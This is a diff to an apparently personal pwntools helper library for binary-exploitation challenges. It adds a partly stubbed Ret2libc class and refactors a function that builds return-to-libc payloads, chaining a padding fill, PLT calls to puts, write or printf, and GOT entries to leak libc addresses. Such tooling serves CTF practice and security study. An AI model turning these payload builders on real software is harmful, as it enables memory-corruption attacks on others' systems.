@@ -14,7 +14,72 @@ def rop(root, code):
     cmd = f"ROPgadget --binary {root} | grep ': {code}' | cut -d ' ' -f 1"
     return get_output(cmd)
 
-def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=0,**kwargs):
+a_or_b = lambda a, b : b if a is None else a
+
+class Ret2libc:
+    def __init__(self) -> None:
+        self.elf = loader.elf
+        pass
+
+    def leak(self):
+        pass
+
+    def system(self):
+        pass
+
+    def i386_leak(self, tool: str, to_leak: str=None, next_addr: int=None, fill2ret:bytes=None, **kwargs):
+        elf = self.elf
+        fill2ret = a_or_b(fill2ret, b"")
+        to_leak = a_or_b(to_leak, tool)
+        next_addr = a_or_b(next_addr, elf.sym['main'])
+        def build_puts():
+            return flat([
+                fill2ret,
+                elf.plt[tool],
+                next_addr,
+                elf.got[to_leak],
+            ])
+
+        def build_write():
+            return flat([
+                fill2ret,
+                elf.plt[tool],
+                next_addr,
+                1,
+                elf.got[to_leak],
+                4
+            ])
+            pass
+        
+        def build_printf(fmt_str_addr: int):
+            return flat([
+                fill2ret,
+                elf.plt[tool],
+                next_addr,
+                fmt_str_addr,
+                elf.got[to_leak],
+            ])
+        
+        if tool not in ['puts','write','printf']:
+            warning(f"I never use this func to leak addr of libc: {tool}")
+            exit()
+
+    def i386_sys(self):
+        pass
+
+    def amd64_leak(self):
+        def build_puts():
+            pass
+        def build_write():
+            pass
+        def build_printf():
+            pass
+        pass
+
+    def amd64_sys(self):
+        pass
+
+def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=None,**kwargs):
     """function that help you to get the address of some function
     ** if you use printf as tool, you need to find fmt_str **
         for example: 
@@ -40,14 +105,16 @@ def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=0,**kwargs):
         info("using i386 ret2libc auto...")
         psize = p32
         if tool == "puts":
-            payload = fill2ret
-            payload+=psize(elf.plt[tool])
-            payload+=psize(next)
-            payload+=psize(elf.got[to_leak])
+            payload = flat([
+                fill2ret,
+                elf.plt[tool],
+                next,
+                elf.got[to_leak],
+            ])
         elif tool == "write":
             payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(1)+psize(elf.got[to_leak])+p32(4)
         elif tool == "printf":
-            if not fmt_str:
+            if fmt_str is None:
                 warning("fmt_str needed!")
                 exit()
             payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(fmt_str)+psize(elf.got[to_leak])
